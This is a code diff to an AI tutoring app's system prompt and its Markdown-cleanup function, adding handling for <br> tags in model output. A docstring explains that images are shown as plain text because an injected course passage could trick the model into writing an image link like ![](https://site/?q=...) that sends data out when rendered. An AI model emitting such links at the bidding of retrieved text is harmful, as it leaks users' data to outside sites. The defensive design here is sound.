@@ -38,7 +38,8 @@ SYSTEM_PROMPT = f"""You are a friendly, sharp tutor helping a student study.
 
 How to answer:
 - Solve problems properly: show your reasoning, work through calculations step by step, and \
-give a clear final answer. Use Markdown, including lists and LaTeX math ($...$) where helpful.
+give a clear final answer. Use Markdown, including lists and LaTeX math ($...$) where helpful, \
+but never HTML: keep each table cell on one line instead of using <br>.
 - When the student's message includes course-material excerpts, read them carefully and base \
 your answer on them. Cite the excerpt behind each claim by its id in square brackets, exactly \
 like [S1] or [S2][S3]. Look for the answer under any wording: a "teacher" may be listed as \
@@ -71,13 +72,16 @@ _CITATION_GROUP = re.compile(r"[\[(]\s*S\d+(?:\s*[,;]\s*S?\d+)*\s*[\])]")
 _FULLWIDTH_CITATION = re.compile(r"【\s*(S\d+)[^】]*】")  # gpt-oss style: 【S2】 or 【S2†L1-L4】
 _DISPLAY_MATH = re.compile(r"\\\[(.+?)\\\]", re.DOTALL)  # \[ ... \]
 _INLINE_MATH = re.compile(r"\\\((.+?)\\\)", re.DOTALL)  # \( ... \)
+_HTML_BREAK = re.compile(r"(?<!`)<br\s*/?>(?!`)", re.IGNORECASE)  # but not `<br>` as code
 
 
 def tidy_markdown(text: str) -> str:
     """Normalize model output so it renders safely and its citations can be checked.
 
     Models differ in formatting: some cite as 【S2】 and write math between \\( \\) or \\[ \\],
-    which Markdown renderers that expect $...$ show as raw text.
+    which Markdown renderers that expect $...$ show as raw text. Answers are never rendered as
+    HTML, so a <br> (which models put in table cells, where Markdown has no line break) would
+    show up literally. It becomes a space inside a table row and a line break elsewhere.
 
     Images are shown as plain text. A browser loads an image as soon as it renders, so a
     passage that tricks the model into writing ![](https://site/?q=...) could send what the
@@ -86,6 +90,9 @@ def tidy_markdown(text: str) -> str:
     one (a "!" followed by 【S1】 becomes "![S1]").
     """
     text = _FULLWIDTH_CITATION.sub(r"[\1]", text)
+    text = "\n".join(
+        _HTML_BREAK.sub(" " if "|" in line else "\n", line) for line in text.split("\n")
+    )
     # Formulas are kept on one line: a line break inside a Markdown table cell would end the
     # table row and break the rest of the answer.
     text = _DISPLAY_MATH.sub(lambda m: f"$${_one_line(m.group(1))}$$", text)
